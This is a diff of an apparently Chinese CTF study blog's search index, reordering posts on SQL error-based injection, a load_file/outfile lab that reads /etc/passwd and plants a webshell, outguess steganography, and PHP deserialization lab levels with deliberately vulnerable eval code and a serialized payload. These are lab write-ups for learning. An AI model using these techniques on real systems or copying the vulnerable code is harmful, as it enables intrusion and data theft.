@@ -363,6 +363,33 @@
       </tags>
   </entry>
   <entry>
+    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
+    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
+<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
+<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
+<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Mysql注入中load_file()与select into outfile命令</title>
     <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
@@ -432,33 +459,6 @@
 <p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
 <h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
 <p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
-    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
-<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
-<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
-<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
-<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -787,42 +787,6 @@
       </tags>
   </entry>
   <entry>
-    <title>(load_file&amp;into outfile)云演sql注入基础</title>
-    <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
-<span id="more"></span>
-
-<p>随便点开一则新闻</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807149490-ec21617b-5012-4f5d-8185-b3cebdc9de04.png" alt="img"></p>
-<p>可以看到有注入点</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807180920-7132a4c1-c9b2-4553-ad4a-0acaf13c396e.png" alt="img"></p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807192065-afb86caa-acdd-403d-bc31-8bdad668664b.png" alt="img"></p>
-<p>使用and 1=1成功回显 和 and 1=2不回显 判断是整形注入</p>
-<p>1.开始查字段</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807279567-51c0a74b-cf9a-4def-bb6d-8a9f8af5e102.png" alt="img"></p>
-<p>2.报错出注入点</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807338156-2120348b-2be0-4c80-a780-2dea2fcd734c.png" alt="img"></p>
-<p>3.查看数据库</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807361859-56b1ba95-be6d-4980-a27b-f3595f294f1a.png" alt="img"></p>
-<p>4.读取linux的/etc/passwd文件</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807410488-5ea7c532-bd44-422a-bbc6-c1f1b8c28f52.png" alt="img"></p>
-<p>5.写🐎</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807460252-e58b1073-e0f4-4c91-b98d-6ef4b09546fb.png" alt="img"></p>
-<p>6.查看是否写入</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807485861-c41aa6bc-0ae0-4a80-ab01-62d3f0ae8bcb.png" alt="img"></p>
-<p>7.连接蚁剑</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807527965-3a6b9d9a-0652-47e1-9221-b4d2aea9124a.png" alt="img"></p>
-<p>8.拿flag</p>
-<p>flag{b4dd36207eb58098c458fe9d9498727b}</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
     <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
     <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
@@ -857,26 +821,39 @@
       </tags>
   </entry>
   <entry>
-    <title>outguess图片隐写工具安装使用</title>
-    <url>/2023/01/07/outguess%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>outguess下载安装</p>
-<p>kail 终端命令输入git clone <a href="https://github.com/crorvick/outguess%EF%BC%8C%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%88%B0%E6%96%87%E4%BB%B6%E5%A4%B9%E3%80%82%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%8F%B3%E9%94%AE%E7%A9%BA%E7%99%BD%E5%A4%84%E9%80%89%E7%BB%88%E7%AB%AF%E6%89%93%E5%BC%80%EF%BC%8C%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4./configure">https://github.com/crorvick/outguess，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令./configure</a> &amp;&amp; make &amp;&amp; make install进行安装。</p>
+    <title>(load_file&amp;into outfile)云演sql注入基础</title>
+    <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
 <span id="more"></span>
 
-<p>使用outguess</p>
-<p>输入outguess -help即可获得相关命令。</p>
-<p>加密：</p>
-<p>outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</p>
-<p>加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。</p>
-<p>解密：</p>
-<p>outguess -k “my secret key” -r out.jpg hidden.txt</p>
-<p>解密之后，紧密内容放在hidden.txt中</p>
+<p>随便点开一则新闻</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807149490-ec21617b-5012-4f5d-8185-b3cebdc9de04.png" alt="img"></p>
+<p>可以看到有注入点</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807180920-7132a4c1-c9b2-4553-ad4a-0acaf13c396e.png" alt="img"></p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807192065-afb86caa-acdd-403d-bc31-8bdad668664b.png" alt="img"></p>
+<p>使用and 1=1成功回显 和 and 1=2不回显 判断是整形注入</p>
+<p>1.开始查字段</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807279567-51c0a74b-cf9a-4def-bb6d-8a9f8af5e102.png" alt="img"></p>
+<p>2.报错出注入点</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807338156-2120348b-2be0-4c80-a780-2dea2fcd734c.png" alt="img"></p>
+<p>3.查看数据库</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807361859-56b1ba95-be6d-4980-a27b-f3595f294f1a.png" alt="img"></p>
+<p>4.读取linux的/etc/passwd文件</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807410488-5ea7c532-bd44-422a-bbc6-c1f1b8c28f52.png" alt="img"></p>
+<p>5.写🐎</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807460252-e58b1073-e0f4-4c91-b98d-6ef4b09546fb.png" alt="img"></p>
+<p>6.查看是否写入</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807485861-c41aa6bc-0ae0-4a80-ab01-62d3f0ae8bcb.png" alt="img"></p>
+<p>7.连接蚁剑</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807527965-3a6b9d9a-0652-47e1-9221-b4d2aea9124a.png" alt="img"></p>
+<p>8.拿flag</p>
+<p>flag{b4dd36207eb58098c458fe9d9498727b}</p>
 ]]></content>
       <categories>
-        <category>ctf工具</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -915,6 +892,60 @@
       </categories>
       <tags>
         <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>outguess图片隐写工具安装使用</title>
+    <url>/2023/01/07/outguess%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>outguess下载安装</p>
+<p>kail 终端命令输入git clone <a href="https://github.com/crorvick/outguess%EF%BC%8C%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%88%B0%E6%96%87%E4%BB%B6%E5%A4%B9%E3%80%82%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%8F%B3%E9%94%AE%E7%A9%BA%E7%99%BD%E5%A4%84%E9%80%89%E7%BB%88%E7%AB%AF%E6%89%93%E5%BC%80%EF%BC%8C%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4./configure">https://github.com/crorvick/outguess，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令./configure</a> &amp;&amp; make &amp;&amp; make install进行安装。</p>
+<span id="more"></span>
+
+<p>使用outguess</p>
+<p>输入outguess -help即可获得相关命令。</p>
+<p>加密：</p>
+<p>outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</p>
+<p>加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。</p>
+<p>解密：</p>
+<p>outguess -k “my secret key” -r out.jpg hidden.txt</p>
+<p>解密之后，紧密内容放在hidden.txt中</p>
+]]></content>
+      <categories>
+        <category>ctf工具</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php-SER-libs反序列化靶场</title>
+    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>构造类的实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
+<p>也就是uesr=daydream   pass=ok</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
+<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -959,37 +990,6 @@
       </categories>
       <tags>
         <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php-SER-libs反序列化靶场</title>
-    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>构造类的实例化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
-<p>也就是uesr=daydream   pass=ok</p>
-<p>构造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span 